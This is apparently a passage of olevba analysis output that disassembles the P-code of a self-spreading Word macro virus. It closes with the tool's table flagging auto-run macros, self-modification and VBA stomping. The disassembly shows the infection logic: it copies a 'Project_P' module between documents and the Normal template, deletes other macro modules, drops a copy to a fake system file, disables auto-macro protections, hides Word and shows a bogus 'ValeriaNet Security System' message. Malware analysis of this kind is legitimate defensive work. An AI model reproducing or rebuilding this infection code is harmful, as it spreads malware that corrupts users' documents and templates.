' 	LitStr 0x0012 "NT.Microsoft Word "
' 	Paren 
' 	Ld vbInformation 
' 	LitStr 0x001A "ValeriaNet Security System"
' 	ArgsCall MsgBox 0x0003 
' Line #200:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #201:
' Line #202:
' 	EndIfBlock 
' Line #203:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #204:
' 	Label Erh1a 
' Line #205:
' 	Ld NorOk 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #206:
' 	OnError Erh1 
' Line #207:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Project_P"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #208:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #209:
' 	LitVarSpecial (False)
' 	Ld NormalTemplate 
' 	MemLd Application 
' 	MemSt Visible 
' Line #210:
' 	Label Erh1 
' Line #211:
' 	EndIfBlock 
' Line #212:
' 	Label Erw1 
' Line #213:
' 	EndFunc 
' Line #214:
' 	FuncDefn (Function NothingElf())
' Line #215:
' 	OnError Erw2 
' Line #216:
' 	LitDI2 0x0000 
' 	St DokSave 
' Line #217:
' 	LitVarSpecial (False)
' 	St DocOk 
' Line #218:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #219:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #220:
' 	OnError Erh2a 
' Line #221:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #222:
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #223:
' 	Ld NMacr 
' 	LitStr 0x0009 "Project_P"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DocOk 
' 	EndIf 
' Line #224:
' 	QuoteRem 0x0006 0x0029 "NMacr = NT.VBProject.VBComponents(i).Name"
' Line #225:
' 	QuoteRem 0x0006 0x0028 "If NMacr = "Project_P" Then Docok = True"
' Line #226:
' 	LineCont 0x0004 07 00 08 00
' 	Ld NMacr 
' 	LitStr 0x0009 "Project_P"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #227:
' 	LitStr 0x0012 "AD. Microsoft Word"
' 	Paren 
' 	Ld vbInformation 
' 	LitStr 0x001A "ValeriaNet Security System"
' 	ArgsCall MsgBox 0x0003 
' Line #228:
' 	LineCont 0x0004 09 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #229:
' 	EndIfBlock 
' Line #230:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #231:
' 	Label Erh2a 
' Line #232:
' 	Ld DocOk 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #233:
' 	OnError Erh2 
' Line #234:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Project_P"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #235:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #236:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #237:
' 	Label Erh2 
' Line #238:
' 	EndIfBlock 
' Line #239:
' 	Label Erw2 
' Line #240:
' 	EndFunc 
' Line #241:
' 	FuncDefn (Function WBT())
' Line #242:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #243:
' 	EndFunc 
' Line #244:
' 	FuncDefn (Function WBF())
' Line #245:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #246:
' 	EndFunc 
' Line #247:
' 	FuncDefn (Function Cute())
' Line #248:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St f56879025 
' Line #249:
' 	LitStr 0x0019 "c:\windows\system\vxd.sys"
' 	LitStr 0x0009 "Project_P"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #250:
' 	Ld f56879025 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo rewing 
' 	EndIf 
' Line #251:
' 	Ld f56879025 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo rewing 
' 	EndIf 
' Line #252:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #253:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Project_P"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St xxx902578112 
' 	EndIf 
' Line #254:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #255:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #256:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Project_P"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St mmf78116 
' 	EndIf 
' Line #257:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #258:
' 	Ld xxx902578112 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld mmf78116 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set o7811902511 
' 	EndIf 
' Line #259:
' 	Ld xxx902578112 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld mmf78116 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set o7811902511 
' 	EndIf 
' Line #260:
' 	LitStr 0x0019 "c:\windows\system\vxd.sys"
' 	Ld o7811902511 
' 	ArgsMemCall Import 0x0001 
' Line #261:
' 	Ld activeinst 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed fileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #262:
' 	Ld mmf78116 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #263:
' 	Label rewing 
' Line #264:
' 	EndFunc 
' Line #265:
' Line #266:
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' Line #274:
' Line #275:
' Line #276:
' Line #277:
' Line #278:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

